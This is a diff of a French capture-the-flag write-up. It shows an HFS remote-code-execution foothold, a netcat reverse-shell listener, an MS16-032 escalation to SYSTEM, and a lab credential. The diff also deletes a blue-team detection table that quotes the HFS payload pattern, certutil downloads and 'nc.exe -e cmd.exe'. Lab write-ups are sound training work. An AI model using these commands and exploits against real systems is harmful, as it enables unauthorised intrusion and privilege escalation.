@@ -83,7 +83,6 @@ nc -lvnp 443   ◄──────(reverse shell)─────────�
 
 python2 39161.py <IP_CIBLE> 80
 
-
 ```
 # script python utilisé
 
@@ -118,7 +117,6 @@ except:
 	Don't forgot to change the Local IP address and Port number on the script"""
 
 ```
-
 
 - **Utilisateur obtenu :** `kostas` (⚠️ pas SYSTEM)
 
@@ -201,8 +199,6 @@ CVE-2015-6100 KB3097877 [Critical] Remote Code Execution
 
 ```
 
-
-
 - Lecture par élimination : **pas de `SeImpersonate`** (jeton fermé), **aucun service/tâche modifiable**, **AlwaysInstallElevated indisponible** → toutes les voies « config » fermées. Il reste : **OS 2012 R2 très peu patché** (31 hotfixes, dernier 2014) → **exploit noyau**.
 - Piste retenue : **MS16-032** (Secondary Logon Handle). Note : l'AutoLogon `kostas / kdeEjDowkS*` trouvé par winPEAS est **mon propre compte** → pas une élévation.
 - Binaire compilé récupéré ici : https://gitlab.com/exploit-database/exploitdb-bin-sploits (EDB **41020**).
@@ -244,18 +240,7 @@ nt authority\system
 
 ---
 
-## 6. Côté Blue Team — détection
-
-| Étape | Trace / Event | Détection |
-| --- | --- | --- |
-| foothold HFS RCE | requêtes `?search=%00{.exec\|...}` dans les logs HFS ; process fils anormal de `hfs.exe` (cmd/cscript) | alerte sur process enfant inattendu d'un service web (T1190, T1059) |
-| download nc.exe | `certutil -urlcache` / requête HTTP sortante vers IP externe | détection living-off-the-land `certutil` + URL (T1105) |
-| reverse shell | `nc.exe -e cmd.exe` → connexion sortante | EDR : nc + connexion sortante (T1059) |
-| privesc MS16-032 | exploitation `seclogon`, création de thread/handle anormale, nouveau process SYSTEM issu d'un compte user | Sysmon 1 (process en SYSTEM avec parent user), EDR noyau (T1068, T1134) |
-
----
-
-## 7. Leçons
+## 6. Leçons
 
 - 1re privesc **Windows** : même logique que Shocker (foothold ≠ SYSTEM), mais côté Windows la voie était le **noyau** faute de jeton/service exploitable.
 - **Méthode d'élimination** (fiche `lire-peas`) : écarter jeton → services → tâches → creds → conclure « noyau ». C'est la formulation attendue à l'oral.
